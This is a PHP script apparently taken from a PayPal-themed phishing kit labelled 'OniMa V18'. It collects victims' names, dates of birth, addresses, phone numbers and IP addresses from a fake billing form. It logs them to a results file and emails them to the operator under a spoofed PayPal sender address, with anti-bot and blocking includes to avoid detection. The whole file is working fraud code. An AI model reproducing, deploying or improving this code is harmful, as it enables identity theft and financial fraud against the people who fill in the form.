<?php
session_start();

@$_SESSION['full_name'] = $_POST['f_name'] . ' ' . $_POST['l_name'];
@$_SESSION['date'] = $_POST['date'];
@$_SESSION['adrs'] = $_POST['adrs'] . ',' . $_POST['zip'];
@$_SESSION['phone'] = $_POST['phone'];



if(isset($_POST['f_name'])){
	if(!empty($_POST['l_name'])){


####################################################################
		
$fn    = $_POST['f_name'];

$ls    = $_POST['l_name'];

$date = $_POST['date'];

$addr = $_POST['adrs'];

$city = $_POST['city'];

$country = $_POST['country'];

$state = $_POST['state'];

$zip = $_POST['zip'];

$phone = $_POST['phone'];

####################################################################
$HF_V = $_SESSION['country_name'];
$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "^_^";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = "Billing -  [ " .$ip. " - " .$wiz. " ]  ";
$headers .= "From:  ^__Rzlt__^ <paypal@support.com>" . "\r\n";

$message = "

################### OniMa V18 ############################
Firt name         =>   ".$fn."
Last name         =>   ".$ls."
Date of Birth     =>   ".$date."
Street address    =>   ".$addr."
City              =>   ".$city."
country           =>   ".$country."
State             =>   ".$state."
ZIP               =>   ".$zip."
PHONE             =>   ".$phone."
IP                =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME              =>   ".$time."
################### OniMa V18 ############################
";
$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
include '../antibots.php';
include './email.php';
include '../block.php';
mail($yourmail, $subject, $message , $headers);

header("location:../car.php?websrc=".md5('W-moustache')."&dispatched=".rand(20,300)."&id=".rand(10000000000,500000000)." ");

 }else{
	header("Location: ../info.php");
}}else{
	header("Location: ../info.php");
}